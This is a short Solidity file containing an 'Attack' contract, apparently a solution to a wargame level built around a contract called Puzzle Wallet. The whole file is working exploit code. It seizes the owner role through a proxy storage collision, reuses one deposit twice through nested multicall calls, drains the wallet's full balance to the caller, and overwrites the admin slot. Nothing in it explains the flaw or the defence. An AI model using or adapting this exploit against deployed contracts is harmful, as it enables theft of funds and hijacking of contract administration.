// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPuzzleWallet {
    function proposeNewAdmin(address)external;
    function multicall(bytes[] calldata)external payable;
    function addToWhitelist(address) external;
    function deposit()external payable;
    function execute(address, uint256, bytes calldata)external payable;
    function setMaxBalance(uint256 ) external;
}
contract Attack{
    receive() external payable { }
    function attack(IPuzzleWallet puzzle)external payable{
        bytes[] memory data = new bytes[](2);
        bytes[] memory dataHelp= new bytes[](1);
        dataHelp[0]=abi.encodeWithSelector(bytes4(keccak256("deposit()")));
        data[0]=abi.encodeWithSelector(puzzle.multicall.selector, dataHelp);
        data[1]=abi.encodeWithSelector(puzzle.multicall.selector, dataHelp);
        puzzle.proposeNewAdmin(address(this));
        puzzle.addToWhitelist(address(this));
        puzzle.multicall{value: address(this).balance}(data);
        puzzle.execute( msg.sender, address(puzzle).balance , "");
        puzzle.setMaxBalance(uint256(uint160(msg.sender)));
        
    }
}